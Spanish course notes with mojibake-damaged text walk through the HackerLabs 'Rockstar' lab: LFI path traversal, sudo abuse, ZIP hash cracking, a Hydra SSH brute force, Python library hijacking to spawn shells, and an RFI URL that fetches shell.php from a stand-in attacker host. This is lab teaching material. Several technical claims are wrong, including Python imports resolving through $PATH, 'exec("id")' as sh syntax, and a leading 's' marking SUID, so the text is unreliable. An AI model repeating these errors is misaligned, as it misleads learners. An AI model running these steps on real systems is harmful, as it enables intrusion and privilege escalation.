
> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos GÃ³mez Pintado (el coletas) Â· **Fecha:** 07/07/2026
> **MÃ³dulo:** ExplotaciÃ³n avanzada / Escalada de privilegios / Movimiento lateral
> **Entorno:** Kali Linux Â· MÃ¡quina Rockstar de HackerLabs

> [!tip] CÃ³mo leer estos apuntes
> La sesiÃ³n completa el ciclo de explotaciÃ³n de la mÃ¡quina **Rockstar** de HackerLabs, partiendo de las credenciales obtenidas en la sesiÃ³n anterior (LFI + fuzzing de parÃ¡metros). Se ven **cuatro tÃ©cnicas diferentes de escalada de privilegios**, cada una con un concepto distinto: modificaciÃ³n de ejecutable, fuerza bruta controlada, library hijacking y path hijacking. TambiÃ©n se explica la teorÃ­a de **Path Traversal**, **LFI** y **RFI**.

---

## â‘  Repaso de la sesiÃ³n anterior

### Fuzzing de parÃ¡metros y LFI

Cuando encontramos un fichero PHP en una enumeraciÃ³n de directorios, la pregunta correcta no es quÃ© hace la pÃ¡gina, sino **quÃ© parÃ¡metros acepta**. Un fichero PHP interactÃºa con el backend, por lo que los parÃ¡metros que le enviamos pueden desencadenar comportamientos no documentados.

> [!important] Regla clave
> El fuzzing de parÃ¡metros **no tiene sentido en HTML** porque HTML es un lenguaje de front que nunca llega al servidor. Solo tiene sentido en ficheros que interactÃºen con el backend: PHP, .NET, JavaScript, Java, Python.

**Proceso de la sesiÃ³n anterior:**

```
1. Enumerar directorios con dirsearch (extensiones: -x php,html,txt,py)
2. Encontrar index.php y db.php
3. Crear fuzzer en Python con Claude
4. Detectar parÃ¡metro "backdoor" en index.php
5. Pasar valor db.php â†’ obtener credenciales: usuario shark
```

### Path Traversal y Local File Inclusion

El parÃ¡metro backdoor era vulnerable a **path traversal**: en lugar de db.php, se puede pasar `../../../../etc/passwd`, navegando hacia atrÃ¡s en el Ã¡rbol de directorios hasta la raÃ­z y leyendo ficheros arbitrarios del sistema.

**Â¿Por quÃ© funciona?** El cÃ³digo PHP tiene una funciÃ³n `file_open()` o equivalente que acepta una variable de usuario sin sanitizar, permitiendo leer cualquier fichero al que tenga acceso el proceso web.

> [!tip] Regla prÃ¡ctica
> El nÃºmero de `../` no tiene lÃ­mite superior efectivo. Una vez se supera la profundidad real del Ã¡rbol, el sistema se queda en la raÃ­z. Por eso se ponen **nueve o mÃ¡s combinaciones** `../`: garantiza llegar a la raÃ­z independientemente de dÃ³nde estÃ© el fichero PHP.

---

## â‘¡ Permisos en Linux â€” tabla de referencia

Antes de entrar en la escalada, es imprescindible entender los permisos.

### Estructura del listado largo (ls -la)

```
Tipo Owner Group Others
 d rwx rwx rwx
 - rw- r-- r--
 s rwx rwx rwx
```

| Primer carÃ¡cter | Significado |
|----------------|-------------|
| `-` | Fichero |
| `d` | Directorio |
| `s` | SUID (ejecutable como propietario) |
| `l` | Enlace simbÃ³lico |

### Pesos binarios de cada permiso

| PosiciÃ³n | Permiso | Valor | DescripciÃ³n |
|----------|---------|-------|-------------|
| 0 | r (read) | 4 | Lectura |
| 1 | w (write) | 2 | Escritura |
| 2 | x (execute) | 1 | EjecuciÃ³n |

### Las 8 combinaciones posibles (por trÃ­o)

| Octal | Binario | Permisos | Significado |
|-------|---------|----------|-------------|
| 0 | 000 | `---` | NingÃºn permiso |
| 1 | 001 | `--x` | Solo ejecuciÃ³n |
| 2 | 010 | `-w-` | Solo escritura |
| 3 | 011 | `-wx` | Escritura y ejecuciÃ³n |
| 4 | 100 | `r--` | Solo lectura |
| 5 | 101 | `r-x` | Lectura y ejecuciÃ³n |
| 6 | 110 | `rw-` | Lectura y escritura |
| 7 | 111 | `rwx` | Todos los permisos |

### Ejemplos de chmod

```bash
chmod 755 fichero # rwx r-x r-x (owner: todo, grupo/resto: lectura+ejecuciÃ³n)
chmod 777 fichero # rwx rwx rwx ( Â¡MALA PRÃCTICA! todos los permisos para todos)
chmod 644 fichero # rw- r-- r-- (owner: lectura+escritura, resto: solo lectura)
```

> [!important] Idea clave para escalada
> Si un usuario tiene permiso de **escritura** sobre un fichero que puede **ejecutar suplantando a otro usuario** (via `sudo -l`), tiene **escalada de privilegios garantizada**. Escritura + ejecuciÃ³n delegada = control total del proceso.

---

## â‘¢ ObtenciÃ³n de shell SSH y primera enumeraciÃ³n

### ConexiÃ³n SSH con credenciales obtenidas

```bash
# Con las credenciales de shark (usuario + contraseÃ±a obtenidos via LFI)
ssh shark@10.0.2.9
# Introducir contraseÃ±a
```

> [!tip] SSH es lo mejor que te puede pasar
> SSH da una shell **estabilizada** con soporte completo de terminal, a diferencia de una reverse shell por webshell. Siempre que puedas, busca obtener credenciales SSH.

### Persistencia con claves RSA

```bash
# En la mÃ¡quina vÃ­ctima (shark)
ssh-keygen -t rsa # Genera par de claves en ~/.ssh/
# La clave privada se guarda localmente
# La pÃºblica se aÃ±ade a authorized_keys para reconectar sin contraseÃ±a
```

### Primeros comandos al entrar

```bash
whoami # Â¿QuiÃ©n soy?
pwd # Â¿DÃ³nde estoy?
uname -a # VersiÃ³n del kernel (para buscar CVEs de escalada)
```

> [!note] Sobre el kernel
> Con la cantidad de vulnerabilidades 0-day de escalada de privilegios en Linux que estÃ¡n saliendo, la versiÃ³n del kernel puede ser una vÃ­a de escalada. En este caso la mÃ¡quina era reciente y parcheada, por lo que la vÃ­a de kernel no era aplicable.

### Lectura de /etc/passwd

```bash
# Mediante el LFI (path traversal en el parÃ¡metro backdoor)
../../../../etc/passwd
```

**Resultado:** Se identifican los usuarios con sesiÃ³n bash activa:

| Usuario | Shell | InterÃ©s |
|---------|-------|---------|
| root | /bin/bash | Objetivo final |
| shark | /bin/bash | Usuario actual (credenciales obtenidas) |
| vvbered | /bin/bash | Siguiente salto |
| lusei | /bin/bash | Tercer salto |
| username3 | /bin/bash | Ãšltimo salto antes de root |

> [!important] PatrÃ³n de escalada
> Cuando hay **mÃºltiples usuarios con shell activa**, indica un entorno de "escalera" donde hay que pivotar de uno en uno antes de llegar a root. No se escala de golpe.

---

## â‘£ Primera escalada: modificaciÃ³n de ejecutable (shark â†’ vvbered)

### IdentificaciÃ³n del vector

```bash
sudo -l
# Resultado: shark puede ejecutar /home/shark/bof como vvbered
```

### AnÃ¡lisis del ejecutable

```bash
ls -la bof
# Propietario: shark (tiene permisos de escritura)

file bof
# ELF 32-bit LSB executable (compilado a cÃ³digo mÃ¡quina)

cat bof
# Contenido ilegible (estÃ¡ compilado, no es texto)

./bof
# Respuesta: "overflow me" (sugiere buffer overflow)
```

> [!note] El buffer overflow no es necesario
> Aunque el ejecutable sugiere un buffer overflow como vector previsto, la tÃ©cnica mÃ¡s simple es **modificar el contenido del fichero** directamente.

### ExplotaciÃ³n

```bash
# shark es propietario del fichero â†’ tiene permiso de escritura
# Puede reemplazar el contenido del ejecutable

echo bash > bof
# Ahora bof contiene "bash" en lugar del ejecutable original

sudo -u vvbered ./bof
# Ejecuta "bash" como vvbered â†’ obtiene shell de vvbered
```

**Resultado:** Shell como vvbered.

> [!important] Concepto clave
> No hace falta entender quÃ© hace un ejecutable para explotarlo. Si puedes **escribir** sobre Ã©l y **ejecutarlo** bajo otro usuario, sustituye su contenido por `bash` y obtÃ©n la shell directamente.

---

## â‘¤ Segunda escalada: fuerza bruta controlada con Hydra (vvbered â†’ lusei)

### Descubrimiento del fichero

```bash
ls -la /home/vvbered/
# Aparece rubiales.zip (propiedad de root, vvbered tiene permisos de lectura)
```

### ExtracciÃ³n del hash del ZIP

```bash
# Descargar el fichero a mÃ¡quina local (python3 -m http.server)
zip2john rubiales.zip > hash.txt

# Resultado: nos muestra que contiene un fichero password.txt
# y el hash de la contraseÃ±a del ZIP
```

> [!note] IdentificaciÃ³n de hashes
> El hash tiene un formato `$algo$...` que especifica el tipo. Blowfish es `$2$`, NTLMv2 es `$3$`. Identificar el tipo es crucial para elegir la herramienta correcta de cracking.

### Cracking del hash con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Resultado: contraseÃ±a "princess"
```

### DescompresiÃ³n del ZIP

```bash
unzip rubiales.zip
# Introducir contraseÃ±a: princess

cat passwords.txt
# Lista de 13 contraseÃ±as
```

### Fuerza bruta con Hydra

```bash
# Crear listado de usuarios (del /etc/passwd)
vi users.txt
# root, shark, vvbered, lusei, username3

# Fuerza bruta sobre SSH
hydra -L users.txt -P passwords.txt ssh://10.0.2.9

# Resultado: lusei tiene la contraseÃ±a "..."
```

> [!important] CuÃ¡ndo justificar la fuerza bruta
> Solo es justificable cuando el espacio de bÃºsqueda es **fino, conocido y pequeÃ±o**. 4 usuarios Ã— 13 contraseÃ±as = 52 combinaciones mÃ¡ximo. No es lo mismo que probar RockYou con 14 millones de contraseÃ±as.

### ConexiÃ³n SSH como lusei

```bash
ssh lusei@10.0.2.9
# Introducir contraseÃ±a obtenida
```

---

## â‘¥ Tercera escalada: library hijacking (lusei â†’ username3)

### IdentificaciÃ³n del vector

```bash
sudo -l
# Resultado: lusei puede ejecutar rubiales.py como username3
```

### AnÃ¡lisis del script

```bash
cat rubiales.py
```

```python
import psutil

def printVirtualMemory():
 vm = psutil.virtual_memory()
 print(f"Name: {vm}")

printVirtualMemory()
```

> [!note] Lectura de cÃ³digo
> No hace falta ser programador, pero sÃ­ entender lo mÃ­nimo. El script importa la librerÃ­a `psutil` y ejecuta una funciÃ³n de memoria virtual.

### Concepto: PATH y bÃºsqueda de librerÃ­as

Cada usuario tiene un `$PATH` propio. Cuando ejecutas un comando o un script importa una librerÃ­a, el sistema busca en las rutas del PATH **en orden**:

```bash
echo $PATH
# /home/lusei/.local/bin:/usr/local/bin:/usr/bin:/bin
```

**La primera ruta que aparece es `/home/lusei/.local/bin`**. Si ahÃ­ hay un fichero con el mismo nombre que la librerÃ­a que se busca, se ejecuta ese en lugar de la librerÃ­a real.

### ExplotaciÃ³n: Library Hijacking

```bash
# Crear fichero malicioso psutil.py en la primera ruta del PATH
vi /home/lusei/.local/bin/psutil.py
```

```python
import os
os.system("bash")
```

```bash
# Ejecutar rubiales.py como username3
sudo -u username3 /usr/bin/python3 /home/lusei/rubiales.py
```

**Â¿QuÃ© pasa?**
1. Python ejecuta rubiales.py como username3
2. rubiales.py hace `import psutil`
3. Python busca psutil.py en el PATH de lusei
4. Encuentra el fichero malicioso **antes** que la librerÃ­a real
5. Ejecuta `os.system("bash")` con privilegios de username3

**Resultado:** Shell como username3.

> [!important] Concepto clave
> Cuando un script importa una librerÃ­a **por nombre relativo** (no ruta absoluta), es vulnerable a library hijacking. Si el atacante controla algÃºn directorio que aparezca antes en el path de bÃºsqueda, puede sustituir cualquier librerÃ­a por cÃ³digo propio.

### Alternativa de Manu: modificaciÃ³n directa del script

```bash
# Como lusei tiene permisos de escritura sobre rubiales.py:
mv rubiales.py algo.py

# Crear nuevo rubiales.py con shell
echo 'import os' > rubiales.py
echo 'os.system("bash")' >> rubiales.py

# Ejecutar como username3
sudo -u username3 /usr/bin/python3 /home/lusei/rubiales.py
```

**Resultado:** Shell como username3 (misma resultado, diferente tÃ©cnica).

---

## â‘¦ Cuarta escalada: ejecuciÃ³n de shell alternativa (username3 â†’ root)

### IdentificaciÃ³n del vector

```bash
sudo -l
# Resultado: username3 puede ejecutar /usr/bin/sh como root
```

### Diferencia entre sh y bash

```bash
# sh es mÃ¡s primitiva que bash
# Para ejecutar comandos en sh se usa exec("comando")

exec("id")
# Resultado: uid=0(root) â†’ Â¡SOMOS ROOT!
```

> [!note] No todas las shells son iguales
> - **bash**: shell estÃ¡ndar, comandos conocidos
> - **sh**: shell primitiva, comandos diferentes
> - **bsh**: basada en Java, usa `exec()` para ejecutar comandos
> - Cada shell tiene su propia sintaxis

### Alternativa con bin/bash

```bash
# Si sudo -l muestra /usr/bin/bash en lugar de /usr/bin/sh
sudo /usr/bin/bash
# Directamente root
```

---

## â‘§ TeorÃ­a: Path Traversal, LFI y RFI

### Path Traversal

TÃ©cnica para navegar fuera del directorio previsto usando secuencias `../`:

```
http://target.com/app?file=../../../../etc/passwd
```

- Cuando un parÃ¡metro acepta un nombre de fichero y **no sanitiza** estas secuencias, el atacante puede salir del directorio raÃ­z de la aplicaciÃ³n
- El nÃºmero de `../` no tiene lÃ­mite superior efectivo (una vez en la raÃ­z, no puede retroceder mÃ¡s)
- PrÃ¡ctica estÃ¡ndar: poner **nueve o mÃ¡s** `../` para garantizar llegar a la raÃ­z

### Local File Inclusion (LFI)

Consecuencia del path traversal: el cÃ³digo PHP **lee o ejecuta** un fichero local que no deberÃ­a ser accesible desde la aplicaciÃ³n web.

```php
// CÃ³digo vulnerable
<?php
$file = $_GET['file'];
include($file); // Sin sanitizar â†’ LFI
?>
```

**MitigaciÃ³n:** Usar rutas absolutas hardcodeadas, no variables de usuario.

### Remote File Inclusion (RFI)

MÃ¡s peligroso y mÃ¡s raro: el parÃ¡metro vulnerable acepta una **URL**, y el servidor hace una peticiÃ³n HTTP a esa URL y ejecuta o incluye el resultado.

```php
// CÃ³digo vulnerable a RFI
<?php
$image = $_GET['image'];
include($image); // Si acepta URLs â†’ RFI
?>
```

**ExplotaciÃ³n:**

```
http://target.com/app?image=http://atacante.com/shell.php
```

- El servidor descarga shell.php desde el atacante y lo ejecuta
- **RCE completo** sin necesidad de subir ningÃºn fichero al servidor objetivo
- La mitigaciÃ³n es no permitir que parÃ¡metros controlados por el usuario sean pasados a funciones de lectura de ficheros o URLs

> [!important] Resumen visual
> ```
> Path Traversal â†’ navegar entre directorios
> â†“
> LFI â†’ leer ficheros locales no autorizados
> â†“
> RFI â†’ incluir y ejecutar ficheros remotos (Â¡RCE!)
> ```

---

## â‘¨ Resumen: las 4 escaladas de Rockstar

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ shark (credenciales via LFI) â”‚
â”‚ â†“ modificaciÃ³n de ejecutable (bof â†’ bash) â”‚
â”‚ vvbered (shell via sudo -u vvbered ./bof) â”‚
â”‚ â†“ zip2john + Hydra (fuerza bruta controlada) â”‚
â”‚ lusei (credenciales SSH) â”‚
â”‚ â†“ library hijacking (psutil.py malicioso en PATH) â”‚
â”‚ username3 (shell via python3 rubiales.py) â”‚
â”‚ â†“ ejecuciÃ³n de shell alternativa (exec en sh) â”‚
â”‚ ROOT (uid=0) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

| TÃ©cnica | Concepto | Herramientas |
|---------|----------|--------------|
| ModificaciÃ³n de ejecutable | Escritura + ejecuciÃ³n delegada = control | echo, sudo -u |
| Fuerza bruta controlada | Espacio de bÃºsqueda finito y conocido | zip2john, john, Hydra |
| Library hijacking | Sustituir librerÃ­a por nombre en PATH | python, import |
| Shell alternativa | Diferentes shells = diferentes comandos | sh, exec() |

---

## â‘© RecapitulaciÃ³n integrada

Esta sesiÃ³n completa el ciclo de explotaciÃ³n de Rockstar desde las credenciales iniciales hasta root, pasando por **cuatro movimientos laterales con tÃ©cnicas distintas**:

1. **ModificaciÃ³n de ejecutable**: si puedes escribir sobre un fichero que ejecutas como otro usuario, reemplÃ¡zalo por bash
2. **Fuerza bruta controlada**: cuando tienes un diccionario pequeÃ±o y conocido, Hydra es rÃ¡pido y efectivo
3. **Library hijacking**: si un script importa librerÃ­as por nombre relativo, puedes sustituirlas en tu PATH
4. **Shell alternativa**: no todas las shells son iguales; aprende a ejecutar comandos en sh, bsh y bash

> [!note] ConexiÃ³n
> Una mÃ¡quina con mÃºltiples usuarios no se escala de golpe: se analiza el `sudo -l` de cada usuario, se busca el eslabÃ³n mÃ¡s dÃ©bil de la cadena y se salta de uno en uno. Cada usuario es una puerta diferente con una tÃ©cnica diferente.

---

## â‘ª Notas de clase

- Esta clase fue impartida por **el coletas** (Carlos GÃ³mez Pintado).
- La mÃ¡quina **Rockstar** se descargÃ³ en la sesiÃ³n anterior y se completÃ³ en esta sesiÃ³n.
- Se hizo un **repaso completo de permisos Linux** por la importancia de entenderlos para la escalada.
- **Manu** resolviÃ³ la cuarta escalada por una vÃ­a diferente (modificaciÃ³n directa del script en lugar de library hijacking).
- Se mencionÃ³ que la prÃ³xima sesiÃ³n se verÃ¡ la mÃ¡quina de **banco** (BBVA) con vulnerabilidades LFI y XXE.
- Se hablÃ³ del **calendario del mÃ¡ster**: web hasta julio, agosto descanso, septiembre-octubre explotaciÃ³n, noviembre directorio activo, diciembre repaso.
- Se mencionÃ³ que habrÃ¡ **prÃ¡cticas de pivoting** y **examen final**.
- **Asier** se quejÃ³ de que la clase era intensa (mientras veÃ­a el partido de Argentina).
- Se creÃ³ un **fuzzer en Python** con Claude durante la clase anterior (value_analyzer.py).
- La discusiÃ³n sobre **permisos Linux** fue muy interactiva con varios alumnos explicando conceptos.

---

> [!note] ConexiÃ³n con otras sesiones
> - **SesiÃ³n anterior** (06/07): Fuzzing de parÃ¡metros, infraestructura anÃ³nima, ingenierÃ­a social, mÃ¡quina Rockstar
> - **SesiÃ³n siguiente** (08/07): MÃ¡quina de banco (BBVA), LFI, XXE, PortSwigger
> - **MÃ¡quina Rockstar** (apunte anterior): Fuzzing de parÃ¡metros con x8, infrahackeo anÃ³nimo

â†’

â†’

